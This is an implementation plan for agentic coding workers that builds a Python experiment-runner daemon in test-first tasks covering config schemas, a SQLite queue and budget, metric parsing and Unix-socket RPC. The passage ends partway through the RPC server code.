# new123 Core Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an autonomous experiment runner with a daemon/client split, Unix-socket RPC, SQLite state, worktree-isolated runs, a MemPalace-shaped wiki, and a two-gear explore/consolidate loop. Ship v1 with full test coverage and a toy example.

**Architecture:** Two processes — `newd` (long-lived supervisor owning queue, workers, budget, SQLite) and `new` (thin client over a Unix domain socket). Workers run experiments in `git worktree` isolation. A markdown wiki (theses / topics / experiments) is the agent's compounding memory; consolidation passes fire every N experiments or on stall.

**Tech Stack:** Python 3.10+, `msgspec` (schema + IPC framing), `PyYAML` (config), `pytest` (tests), `uv` (env + lock), stdlib only for sockets / subprocess / sqlite3 / signal.

**Reference:** Design spec at `docs/specs/2026-04-18-design.md`.

---

## Execution notes

- **TDD throughout.** Every task starts with a failing test, then the minimal implementation, then a commit.
- **Absolute paths.** All file paths below are relative to the project root `new123/`. The project root is `/root/parameters/autoresearch_experimentation/work_checker/new123/`.
- **Commits.** One commit per numbered task. Conventional-commits prefix (`feat:`, `test:`, `chore:`).
- **Git branch.** Do the whole plan on `master` of a fresh git repo in `new123/` (first task initializes the repo).
- **Python.** Use `uv sync` once `pyproject.toml` exists. All later commands prefix with `uv run` or activate `.venv`.
- **Style.** Terse. No emojis. Minimal docstrings (one short sentence or none). Short names ok where scope is obvious. This is personal software — make it look personal.

---

## Task 1: Project bootstrap

**Files:**
- Create: `pyproject.toml`, `.gitignore`, `.python-version`, `README.md` (stub), `src/new/__init__.py`, `tests/__init__.py`, `tests/conftest.py`
- Test: `tests/test_smoke.py`

- [ ] **Step 1: Initialize git repo**

```bash
cd /root/parameters/autoresearch_experimentation/work_checker/new123
git init -b master
git config user.email "you@localhost"
git config user.name "you"
```

- [ ] **Step 2: Write `.python-version`**

```
3.11
```

- [ ] **Step 3: Write `pyproject.toml`**

```toml
[project]
name = "new123"
version = "0.0.1"
requires-python = ">=3.11"
dependencies = [
    "msgspec>=0.18",
    "pyyaml>=6.0",
]

[project.optional-dependencies]
dev = [
    "pytest>=8.0",
    "pytest-timeout>=2.2",
]

[project.scripts]
new = "new.cli:main"
newd = "new.daemon:main"

[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.hatch.build.targets.wheel]
packages = ["src/new"]

[tool.pytest.ini_options]
testpaths = ["tests"]
addopts = "-ra --timeout=30"
```

- [ ] **Step 4: Write `.gitignore`**

```
__pycache__/
*.pyc
*.egg-info/
.venv/
.new/
build/
dist/
.pytest_cache/
```

- [ ] **Step 5: Write `README.md` stub**

```markdown
# new123

[placeholder - final README written in Task 15]
```

- [ ] **Step 6: Write `src/new/__init__.py`**

```python
__version__ = "0.0.1"
```

- [ ] **Step 7: Write `tests/__init__.py` (empty) and `tests/conftest.py`**

`tests/__init__.py`:
```python
```

`tests/conftest.py`:
```python
import os
import tempfile
import pytest


@pytest.fixture
def tmp_project(tmp_path, monkeypatch):
    """Run inside a throwaway project dir with PROJECT_ROOT set."""
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NEW_PROJECT_ROOT", str(tmp_path))
    return tmp_path
```

- [ ] **Step 8: Write `tests/test_smoke.py`**

```python
import new


def test_version():
    assert new.__version__
```

- [ ] **Step 9: Install deps and run the test**

```bash
uv venv
uv pip install -e '.[dev]'
uv run pytest tests/test_smoke.py -v
```
Expected: PASS.

- [ ] **Step 10: Commit**

```bash
git add pyproject.toml .gitignore .python-version README.md src/new/__init__.py tests/__init__.py tests/conftest.py tests/test_smoke.py
git commit -m "chore: project bootstrap"
```

---

## Task 2: util.py — paths, pidfile, flock, atomic write

**Files:**
- Create: `src/new/util.py`, `tests/test_util.py`

- [ ] **Step 1: Write failing test `tests/test_util.py`**

```python
import os
import time
from pathlib import Path

import pytest

from new import util


def test_project_root_from_env(tmp_project):
    assert util.project_root() == tmp_project


def test_project_root_missing(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("NEW_PROJECT_ROOT", raising=False)
    # falls back to cwd
    assert util.project_root() == tmp_path


def test_new_dir_created(tmp_project):
    d = util.new_dir()
    assert d.exists() and d.is_dir()
    assert d == tmp_project / ".new"


def test_atomic_write_creates_file(tmp_project):
    p = tmp_project / "f.txt"
    util.atomic_write(p, "hello")
    assert p.read_text() == "hello"


def test_atomic_write_overwrites(tmp_project):
    p = tmp_project / "f.txt"
    p.write_text("old")
    util.atomic_write(p, "new")
    assert p.read_text() == "new"


def test_pidfile_roundtrip(tmp_project):
    pf = tmp_project / ".new" / "newd.pid"
    pf.parent.mkdir(parents=True)
    util.write_pidfile(pf, 4242)
    assert util.read_pidfile(pf) == 4242


def test_pidfile_stale_detection(tmp_project):
    pf = tmp_project / ".new" / "newd.pid"
    pf.parent.mkdir(parents=True)
    util.write_pidfile(pf, 999_999_999)   # almost certainly unused
    assert util.pid_alive(util.read_pidfile(pf)) is False


def test_pid_alive_self():
    assert util.pid_alive(os.getpid()) is True


def test_flock_blocks_concurrent(tmp_project):
    lock = tmp_project / "lockfile"
    with util.flock(lock):
        # a non-blocking second attempt raises
        with pytest.raises(BlockingIOError):
            with util.flock(lock, blocking=False):
                pass
```

- [ ] **Step 2: Run test — expect FAIL**

```bash
uv run pytest tests/test_util.py -v
```
Expected: ModuleNotFoundError or missing-attribute failures.

- [ ] **Step 3: Implement `src/new/util.py`**

```python
import contextlib
import errno
import fcntl
import os
from pathlib import Path


def project_root() -> Path:
    p = os.environ.get("NEW_PROJECT_ROOT")
    if p:
        return Path(p).resolve()
    return Path.cwd().resolve()


def new_dir() -> Path:
    d = project_root() / ".new"
    d.mkdir(parents=True, exist_ok=True)
    return d


def atomic_write(path: Path, data: str | bytes) -> None:
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
    tmp = path.with_suffix(path.suffix + ".tmp")
    with open(tmp, mode) as f:
        f.write(data)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)


def write_pidfile(pf: Path, pid: int) -> None:
    atomic_write(pf, str(pid))


def read_pidfile(pf: Path) -> int | None:
    try:
        return int(pf.read_text().strip())
    except (FileNotFoundError, ValueError):
        return None


def pid_alive(pid: int | None) -> bool:
    if pid is None:
        return False
    try:
        os.kill(pid, 0)
    except OSError as e:
        return e.errno == errno.EPERM
    return True


@contextlib.contextmanager
def flock(path: Path, *, blocking: bool = True):
    path.parent.mkdir(parents=True, exist_ok=True)
    fd = os.open(path, os.O_CREAT | os.O_RDWR, 0o600)
    try:
        mode = fcntl.LOCK_EX if blocking else fcntl.LOCK_EX | fcntl.LOCK_NB
        fcntl.flock(fd, mode)
        yield
    finally:
        try:
            fcntl.flock(fd, fcntl.LOCK_UN)
        finally:
            os.close(fd)
```

- [ ] **Step 4: Run tests — expect PASS**

```bash
uv run pytest tests/test_util.py -v
```
Expected: all tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/new/util.py tests/test_util.py
git commit -m "feat: util — paths, pidfile, atomic write, flock"
```

---

## Task 3: schema.py — msgspec structs for config, RPC, records

**Files:**
- Create: `src/new/schema.py`, `tests/test_schema.py`

- [ ] **Step 1: Write failing tests `tests/test_schema.py`**

```python
import msgspec
import pytest

from new import schema


def test_config_minimal():
    c = schema.load_config_yaml("""
run_command: python train.py
grep_pattern: "^val_loss:"
metric:
  name: val_loss
  direction: minimize
""")
    assert c.run_command == ["python", "train.py"]
    assert c.metric.direction == "minimize"
    assert c.workers == 1
    assert c.budget.max_experiments == 500


def test_config_bad_regex_refused():
    with pytest.raises(msgspec.ValidationError):
        schema.load_config_yaml("""
run_command: python train.py
grep_pattern: "["
metric:
  name: x
  direction: minimize
""")


def test_config_bad_direction_refused():
    with pytest.raises(msgspec.ValidationError):
        schema.load_config_yaml("""
run_command: python train.py
grep_pattern: "^x:"
metric:
  name: x
  direction: sideways
""")


def test_run_command_empty_refused():
    with pytest.raises(msgspec.ValidationError):
        schema.load_config_yaml("""
run_command: ""
grep_pattern: "^x:"
metric:
  name: x
  direction: minimize
""")


def test_rpc_request_roundtrip():
    r = schema.Req(type="status", payload=b"")
    b = schema.encode(r)
    back = schema.decode(b, schema.Req)
    assert back.type == "status"


def test_run_record_roundtrip():
    rr = schema.RunRecord(
        exp_num=1, commit_sha="abc1234", metric=0.1, metric_holdout=None,
        status="keep", duration_s=10.0, started_at=1.0, ended_at=11.0,
        hypothesis="h", verdict="v", description="d",
        log_path="logs/1.log", wiki_refs=[],
    )
    b = schema.encode(rr)
    back = schema.decode(b, schema.RunRecord)
    assert back.exp_num == 1
    assert back.status == "keep"
```

- [ ] **Step 2: Run — expect FAIL**

```bash
uv run pytest tests/test_schema.py -v
```

- [ ] **Step 3: Implement `src/new/schema.py`**

```python
import re
from typing import Literal

import msgspec
import yaml

Direction = Literal["minimize", "maximize"]
Status = Literal["keep", "discard", "crash", "skip"]
TriggerKind = Literal["count", "stall", "manual"]


class Metric(msgspec.Struct, forbid_unknown_fields=True):
    name: str
    direction: Direction


class Holdout(msgspec.Struct, forbid_unknown_fields=True):
    run_command: list[str]
    grep_pattern: str
    every: int = 5


class Budget(msgspec.Struct, forbid_unknown_fields=True):
    max_experiments: int = 500
    max_wallclock_hours: float = 8.0
    max_cost_usd: float = 0.0


class Config(msgspec.Struct, forbid_unknown_fields=True):
    run_command: list[str]
    grep_pattern: str
    metric: Metric
    workers: int = 1
    consolidate_every: int = 20
    consolidate_budget_minutes: int = 10
    improvement_threshold: float = 0.005
    session_tag: str = ""
    timeout_seconds: int = 600
    budget: Budget = msgspec.field(default_factory=Budget)
    holdout: Holdout | None = None


def _split_cmd(v):
    import shlex
    if isinstance(v, list):
        return [str(x) for x in v]
    if isinstance(v, str):
        return shlex.split(v)
    raise ValueError("run_command must be string or list")


def load_config_yaml(text: str) -> Config:
    raw = yaml.safe_load(text) or {}
    if "run_command" in raw:
        raw["run_command"] = _split_cmd(raw["run_command"])
    if not raw.get("run_command"):
        raise msgspec.ValidationError("run_command must not be empty")
    if "holdout" in raw and raw["holdout"]:
        raw["holdout"]["run_command"] = _split_cmd(raw["holdout"]["run_command"])
    gp = raw.get("grep_pattern")
    if gp:
        try:
            re.compile(gp)
        except re.error as e:
            raise msgspec.ValidationError(f"bad grep_pattern: {e}")
    return msgspec.convert(raw, Config)


# ---------- RPC wire format ----------

class Req(msgspec.Struct):
    type: str
    payload: bytes = b""


class Resp(msgspec.Struct):
    ok: bool
    payload: bytes = b""
    error: str = ""


# ---------- Records ----------

class RunRecord(msgspec.Struct):
    exp_num: int
    commit_sha: str
    metric: float | None
    metric_holdout: float | None
    status: Status
    duration_s: float
    started_at: float
    ended_at: float
    hypothesis: str
    verdict: str
    description: str
    log_path: str
    wiki_refs: list[str]


class QueueItem(msgspec.Struct):
    id: int
    hypothesis: str
    description: str
    priority: int = 0


class StatusReport(msgspec.Struct):
    daemon_up: bool
    queue_size: int
    in_flight: int
    budget_used: dict[str, float]
    budget_cap: dict[str, float]
    last_runs: list[RunRecord]
    halted_reason: str = ""


_json = msgspec.json
_mp = msgspec.msgpack


def encode(obj) -> bytes:
    return _mp.encode(obj)


def decode(data: bytes, typ):
    return _mp.decode(data, type=typ)
```

- [ ] **Step 4: Run tests — PASS**

```bash
uv run pytest tests/test_schema.py -v
```

- [ ] **Step 5: Commit**

```bash
git add src/new/schema.py tests/test_schema.py
git commit -m "feat: schema — config, rpc, records via msgspec"
```

---

## Task 4: store.py — SQLite init + kv

**Files:**
- Create: `src/new/store.py`, `tests/test_store.py`

- [ ] **Step 1: Write failing test**

```python
from pathlib import Path

from new import store


def test_open_creates_tables(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    cur = s.conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name"
    )
    names = {r[0] for r in cur}
    assert {"queue", "runs", "budget", "kv", "consolidations", "baseline"} <= names
    s.close()


def test_kv_set_get(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    s.kv_set("foo", "1")
    assert s.kv_get("foo") == "1"
    assert s.kv_get("missing") is None
    s.close()


def test_counter_increment(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    assert s.next_exp_num() == 1
    assert s.next_exp_num() == 2
    assert s.next_exp_num() == 3
    s.close()


def test_wal_mode(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    mode = s.conn.execute("PRAGMA journal_mode").fetchone()[0]
    assert mode.lower() == "wal"
    s.close()
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Implement `src/new/store.py`**

```python
import sqlite3
import time
from pathlib import Path


_SCHEMA = """
CREATE TABLE IF NOT EXISTS queue (
  id          INTEGER PRIMARY KEY AUTOINCREMENT,
  spec        TEXT NOT NULL,
  priority    INTEGER NOT NULL DEFAULT 0,
  queued_at   REAL NOT NULL,
  claimed_by  TEXT,
  claimed_at  REAL
);
CREATE TABLE IF NOT EXISTS runs (
  id              INTEGER PRIMARY KEY AUTOINCREMENT,
  exp_num         INTEGER NOT NULL UNIQUE,
  commit_sha      TEXT NOT NULL,
  metric          REAL,
  metric_holdout  REAL,
  status          TEXT NOT NULL CHECK(status IN ('keep','discard','crash','skip')),
  duration_s      REAL NOT NULL,
  started_at      REAL NOT NULL,
  ended_at        REAL NOT NULL,
  hypothesis      TEXT,
  verdict         TEXT,
  description     TEXT,
  log_path        TEXT,
  wiki_refs       TEXT
);
CREATE TABLE IF NOT EXISTS budget (
  key         TEXT PRIMARY KEY,
  used        REAL NOT NULL,
  cap         REAL NOT NULL,
  updated_at  REAL NOT NULL
);
CREATE TABLE IF NOT EXISTS kv (
  k  TEXT PRIMARY KEY,
  v  TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS consolidations (
  id              INTEGER PRIMARY KEY AUTOINCREMENT,
  triggered_by    TEXT CHECK(triggered_by IN ('count','stall','manual')),
  started_at      REAL NOT NULL,
  ended_at        REAL,
  pages_touched   INTEGER,
  notes           TEXT
);
CREATE TABLE IF NOT EXISTS baseline (
  n           INTEGER NOT NULL,
  mean        REAL NOT NULL,
  stddev      REAL NOT NULL,
  samples     TEXT NOT NULL,
  taken_at    REAL NOT NULL
);
"""


class Store:
    def __init__(self, conn: sqlite3.Connection):
        self.conn = conn

    def close(self):
        self.conn.close()

    def kv_set(self, k: str, v: str) -> None:
        with self.conn:
            self.conn.execute(
                "INSERT INTO kv(k,v) VALUES(?,?) "
                "ON CONFLICT(k) DO UPDATE SET v=excluded.v",
                (k, v),
            )

    def kv_get(self, k: str) -> str | None:
        r = self.conn.execute("SELECT v FROM kv WHERE k=?", (k,)).fetchone()
        return r[0] if r else None

    def next_exp_num(self) -> int:
        with self.conn:
            cur = self.conn.execute("BEGIN IMMEDIATE")
            r = self.conn.execute(
                "SELECT v FROM kv WHERE k='next_exp_num'"
            ).fetchone()
            n = int(r[0]) if r else 1
            self.conn.execute(
                "INSERT INTO kv(k,v) VALUES('next_exp_num',?) "
                "ON CONFLICT(k) DO UPDATE SET v=excluded.v",
                (str(n + 1),),
            )
        return n


def open_store(path: Path) -> Store:
    path.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(path, isolation_level=None, timeout=5.0)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA foreign_keys=ON")
    conn.executescript(_SCHEMA)
    return Store(conn)
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/store.py tests/test_store.py
git commit -m "feat: store — sqlite init, kv, exp_num counter"
```

---

## Task 5: store.py — queue operations

**Files:**
- Modify: `src/new/store.py`
- Modify: `tests/test_store.py`

- [ ] **Step 1: Append queue tests to `tests/test_store.py`**

```python
def test_enqueue_and_size(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    assert s.queue_size() == 0
    qid = s.enqueue('{"h":"x"}', priority=0)
    assert qid == 1
    assert s.queue_size() == 1
    s.close()


def test_claim_respects_fifo_and_priority(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    s.enqueue('{"h":"a"}', priority=0)
    s.enqueue('{"h":"b"}', priority=5)
    s.enqueue('{"h":"c"}', priority=0)
    first = s.claim_one("w1")
    assert '"b"' in first["spec"]
    second = s.claim_one("w1")
    assert '"a"' in second["spec"]
    s.close()


def test_claim_empty_returns_none(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    assert s.claim_one("w1") is None
    s.close()


def test_unclaim_stale(tmp_project):
    import time
    s = store.open_store(tmp_project / ".new" / "state.db")
    s.enqueue('{"h":"x"}', priority=0)
    item = s.claim_one("w1")
    # manually age the claim
    s.conn.execute("UPDATE queue SET claimed_at = ? WHERE id=?",
                   (time.time() - 3600, item["id"]))
    n = s.unclaim_stale(older_than_s=60)
    assert n == 1
    again = s.claim_one("w1")
    assert again is not None
    s.close()
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Add methods to `Store` in `src/new/store.py`**

```python
    def enqueue(self, spec: str, priority: int = 0) -> int:
        with self.conn:
            cur = self.conn.execute(
                "INSERT INTO queue(spec, priority, queued_at) VALUES(?,?,?)",
                (spec, priority, time.time()),
            )
            return cur.lastrowid

    def queue_size(self) -> int:
        r = self.conn.execute(
            "SELECT COUNT(*) FROM queue WHERE claimed_by IS NULL"
        ).fetchone()
        return r[0]

    def claim_one(self, worker: str) -> dict | None:
        # higher priority first, then FIFO
        with self.conn:
            self.conn.execute("BEGIN IMMEDIATE")
            r = self.conn.execute(
                "SELECT id, spec FROM queue WHERE claimed_by IS NULL "
                "ORDER BY priority DESC, id ASC LIMIT 1"
            ).fetchone()
            if not r:
                return None
            qid, spec = r
            self.conn.execute(
                "UPDATE queue SET claimed_by=?, claimed_at=? WHERE id=?",
                (worker, time.time(), qid),
            )
        return {"id": qid, "spec": spec}

    def unclaim_stale(self, older_than_s: float) -> int:
        cutoff = time.time() - older_than_s
        with self.conn:
            cur = self.conn.execute(
                "UPDATE queue SET claimed_by=NULL, claimed_at=NULL "
                "WHERE claimed_by IS NOT NULL AND claimed_at < ?",
                (cutoff,),
            )
            return cur.rowcount

    def dequeue(self, qid: int) -> None:
        with self.conn:
            self.conn.execute("DELETE FROM queue WHERE id=?", (qid,))
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/store.py tests/test_store.py
git commit -m "feat: store — queue enqueue, claim, unclaim, dequeue"
```

---

## Task 6: store.py — runs + consolidations + baseline

**Files:**
- Modify: `src/new/store.py`
- Modify: `tests/test_store.py`

- [ ] **Step 1: Append tests**

```python
def test_insert_and_list_runs(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    s.insert_run(
        exp_num=1, commit_sha="abc", metric=0.5, metric_holdout=None,
        status="keep", duration_s=1.0, started_at=1.0, ended_at=2.0,
        hypothesis="h", verdict="v", description="d",
        log_path="logs/1.log", wiki_refs=[],
    )
    rows = s.last_runs(5)
    assert len(rows) == 1
    assert rows[0]["exp_num"] == 1
    s.close()


def test_runs_since_last_consolidation(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    for i in range(3):
        s.insert_run(
            exp_num=i + 1, commit_sha="x", metric=0.0, metric_holdout=None,
            status="keep", duration_s=0.0, started_at=0.0, ended_at=0.0,
            hypothesis="", verdict="", description="",
            log_path="", wiki_refs=[],
        )
    assert s.runs_since_last_consolidation() == 3
    s.record_consolidation_start("count")
    s.record_consolidation_end(pages_touched=2, notes="ok")
    assert s.runs_since_last_consolidation() == 0
    s.close()


def test_baseline_persist(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    s.save_baseline(n=3, mean=0.5, stddev=0.01, samples=[0.49, 0.50, 0.51])
    b = s.get_baseline()
    assert b["n"] == 3 and abs(b["mean"] - 0.5) < 1e-9
    s.close()
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Add methods**

```python
    def insert_run(self, *, exp_num, commit_sha, metric, metric_holdout,
                   status, duration_s, started_at, ended_at,
                   hypothesis, verdict, description, log_path, wiki_refs):
        import json
        with self.conn:
            self.conn.execute(
                "INSERT INTO runs(exp_num,commit_sha,metric,metric_holdout,"
                "status,duration_s,started_at,ended_at,hypothesis,verdict,"
                "description,log_path,wiki_refs) "
                "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (exp_num, commit_sha, metric, metric_holdout, status,
                 duration_s, started_at, ended_at, hypothesis, verdict,
                 description, log_path, json.dumps(wiki_refs)),
            )

    def last_runs(self, n: int) -> list[dict]:
        import json
        cur = self.conn.execute(
            "SELECT exp_num,commit_sha,metric,metric_holdout,status,"
            "duration_s,started_at,ended_at,hypothesis,verdict,description,"
            "log_path,wiki_refs FROM runs ORDER BY exp_num DESC LIMIT ?",
            (n,),
        )
        cols = [d[0] for d in cur.description]
        rows = [dict(zip(cols, r)) for r in cur]
        for r in rows:
            r["wiki_refs"] = json.loads(r["wiki_refs"] or "[]")
        return rows

    def runs_since_last_consolidation(self) -> int:
        r = self.conn.execute(
            "SELECT COALESCE(MAX(started_at),0) FROM consolidations"
        ).fetchone()
        cutoff = r[0]
        r = self.conn.execute(
            "SELECT COUNT(*) FROM runs WHERE started_at > ?", (cutoff,)
        ).fetchone()
        return r[0]

    def record_consolidation_start(self, triggered_by: str) -> int:
        with self.conn:
            cur = self.conn.execute(
                "INSERT INTO consolidations(triggered_by, started_at) "
                "VALUES(?,?)",
                (triggered_by, time.time()),
            )
            return cur.lastrowid

    def record_consolidation_end(self, *, pages_touched: int, notes: str) -> None:
        with self.conn:
            self.conn.execute(
                "UPDATE consolidations SET ended_at=?, pages_touched=?, notes=? "
                "WHERE id = (SELECT MAX(id) FROM consolidations)",
                (time.time(), pages_touched, notes),
            )

    def save_baseline(self, *, n, mean, stddev, samples):
        import json
        with self.conn:
            self.conn.execute("DELETE FROM baseline")
            self.conn.execute(
                "INSERT INTO baseline(n,mean,stddev,samples,taken_at) "
                "VALUES(?,?,?,?,?)",
                (n, mean, stddev, json.dumps(samples), time.time()),
            )

    def get_baseline(self) -> dict | None:
        import json
        r = self.conn.execute(
            "SELECT n,mean,stddev,samples,taken_at FROM baseline LIMIT 1"
        ).fetchone()
        if not r:
            return None
        return dict(n=r[0], mean=r[1], stddev=r[2],
                    samples=json.loads(r[3]), taken_at=r[4])
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/store.py tests/test_store.py
git commit -m "feat: store — runs, consolidations, baseline"
```

---

## Task 7: budget.py — atomic ledger

**Files:**
- Create: `src/new/budget.py`, `tests/test_budget.py`

- [ ] **Step 1: Write failing tests**

```python
from new import budget, store


def test_init_and_state(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    budget.init(s, experiments=100, wallclock_h=1.0, cost_usd=0.0)
    st = budget.state(s)
    assert st["caps"]["experiments"] == 100
    assert st["used"]["experiments"] == 0


def test_consume_experiments(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    budget.init(s, experiments=2, wallclock_h=1.0, cost_usd=0.0)
    assert budget.try_consume(s, "experiments", 1) is True
    assert budget.try_consume(s, "experiments", 1) is True
    assert budget.try_consume(s, "experiments", 1) is False


def test_halt_reason(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    budget.init(s, experiments=1, wallclock_h=1.0, cost_usd=0.0)
    budget.try_consume(s, "experiments", 1)
    assert budget.try_consume(s, "experiments", 1) is False
    assert "experiments cap" in budget.halt_reason(s)


def test_disabled_cap_is_unbounded(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    budget.init(s, experiments=5, wallclock_h=1.0, cost_usd=0.0)
    # cost is 0.0 = disabled
    for _ in range(10):
        assert budget.try_consume(s, "cost", 1000.0) is True
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Implement `src/new/budget.py`**

```python
import time


def init(s, *, experiments: int, wallclock_h: float, cost_usd: float) -> None:
    rows = [
        ("experiments", experiments),
        ("wallclock", wallclock_h * 3600.0),
        ("cost", cost_usd),
    ]
    with s.conn:
        for k, cap in rows:
            s.conn.execute(
                "INSERT INTO budget(key,used,cap,updated_at) VALUES(?,?,?,?) "
                "ON CONFLICT(key) DO UPDATE SET cap=excluded.cap, updated_at=excluded.updated_at",
                (k, 0.0, float(cap), time.time()),
            )


def state(s) -> dict:
    used, caps = {}, {}
    for r in s.conn.execute("SELECT key, used, cap FROM budget"):
        used[r[0]] = r[1]
        caps[r[0]] = r[2]
    return {"used": used, "caps": caps}


def try_consume(s, key: str, amount: float) -> bool:
    with s.conn:
        s.conn.execute("BEGIN IMMEDIATE")
        r = s.conn.execute(
            "SELECT used, cap FROM budget WHERE key=?", (key,)
        ).fetchone()
        if not r:
            return False
        used, cap = r
        if cap <= 0:    # 0 or less = disabled
            return True
        if used + amount > cap:
            return False
        s.conn.execute(
            "UPDATE budget SET used = used + ?, updated_at = ? WHERE key=?",
            (amount, time.time(), key),
        )
    return True


def halt_reason(s) -> str:
    st = state(s)
    parts = []
    for k, cap in st["caps"].items():
        if cap <= 0:
            continue
        if st["used"][k] >= cap:
            parts.append(f"{k} cap reached ({st['used'][k]:.2f}/{cap:.2f})")
    return "; ".join(parts)
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/budget.py tests/test_budget.py
git commit -m "feat: budget — atomic ledger with caps"
```

---

## Task 8: metric.py — parse regex, mean/stddev

**Files:**
- Create: `src/new/metric.py`, `tests/test_metric.py`

- [ ] **Step 1: Write tests**

```python
import pytest

from new import metric


def test_parse_single_line():
    log = "other\nval_loss: 0.1234\nbye\n"
    v = metric.parse(log, r"^val_loss:")
    assert abs(v - 0.1234) < 1e-9


def test_parse_last_match_wins():
    log = "val_loss: 0.5\nval_loss: 0.3\n"
    v = metric.parse(log, r"^val_loss:")
    assert abs(v - 0.3) < 1e-9


def test_parse_no_match_returns_none():
    assert metric.parse("nope\n", r"^val_loss:") is None


def test_parse_bad_number_returns_none():
    assert metric.parse("val_loss: not_a_number\n", r"^val_loss:") is None


def test_stats():
    mean, sd = metric.stats([1.0, 2.0, 3.0])
    assert mean == 2.0
    assert 0.81 < sd < 0.82  # sample stddev
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Implement `src/new/metric.py`**

```python
import math
import re


_NUM = re.compile(r"[-+]?\d+(?:\.\d+)?(?:[eE][-+]?\d+)?")


def parse(text: str, pattern: str) -> float | None:
    rx = re.compile(pattern, re.MULTILINE)
    last = None
    for line in text.splitlines():
        if rx.search(line):
            num = _NUM.search(line[rx.search(line).end():])
            if num:
                try:
                    last = float(num.group(0))
                except ValueError:
                    pass
    return last


def stats(values: list[float]) -> tuple[float, float]:
    n = len(values)
    if n == 0:
        return 0.0, 0.0
    mean = sum(values) / n
    if n < 2:
        return mean, 0.0
    var = sum((x - mean) ** 2 for x in values) / (n - 1)
    return mean, math.sqrt(var)
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/metric.py tests/test_metric.py
git commit -m "feat: metric — regex parse, last-match-wins, mean/stddev"
```

---

## Task 9: rpc.py — UDS framing, server, client

**Files:**
- Create: `src/new/rpc.py`, `tests/test_rpc.py`

- [ ] **Step 1: Tests**

```python
import threading
import time

import pytest

from new import rpc, schema


def _server_thread(sock_path, handler):
    stop = threading.Event()

    def run():
        rpc.serve(sock_path, handler, stop)

    t = threading.Thread(target=run, daemon=True)
    t.start()
    # wait until socket exists
    for _ in range(50):
        if sock_path.exists():
            break
        time.sleep(0.01)
    return t, stop


def test_roundtrip_ok(tmp_project):
    sock = tmp_project / ".new" / "sock"

    def handler(req: schema.Req) -> schema.Resp:
        return schema.Resp(ok=True, payload=b"pong-" + req.payload)

    t, stop = _server_thread(sock, handler)
    try:
        resp = rpc.call(sock, schema.Req(type="ping", payload=b"hi"))
        assert resp.ok and resp.payload == b"pong-hi"
    finally:
        stop.set()
        rpc.call(sock, schema.Req(type="__quit__"))  # nudge accept
        t.join(timeout=1.0)


def test_error_handler(tmp_project):
    sock = tmp_project / ".new" / "sock"

    def handler(req):
        raise RuntimeError("boom")

    t, stop = _server_thread(sock, handler)
    try:
        resp = rpc.call(sock, schema.Req(type="x"))
        assert not resp.ok
        assert "boom" in resp.error
    finally:
        stop.set()
        rpc.call(sock, schema.Req(type="__quit__"))
        t.join(timeout=1.0)


def test_client_refused_when_no_server(tmp_project):
    with pytest.raises(ConnectionError):
        rpc.call(tmp_project / "nope.sock", schema.Req(type="x"), timeout=0.1)
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Implement `src/new/rpc.py`**

```python
import os
import socket
import struct
import threading
from pathlib import Path
from typing import Callable

from . import schema


_HDR = struct.Struct(">I")   # 4-byte big-endian length


def _send(sock: socket.socket, data: bytes) -> None:
    sock.sendall(_HDR.pack(len(data)) + data)


def _recv(sock: socket.socket) -> bytes:
    hdr = _recv_n(sock, 4)
    (n,) = _HDR.unpack(hdr)
    return _recv_n(sock, n)


def _recv_n(sock: socket.socket, n: int) -> bytes:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed")
        buf += chunk
    return bytes(buf)


def serve(sock_path: Path, handler: Callable[[schema.Req], schema.Resp],
          stop: threading.Event) -> None:
    sock_path = Path(sock_path)
    sock_path.parent.mkdir(parents=True, exist_ok=True)
    if sock_path.exists():
        sock_path.unlink()
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(str(sock_path))
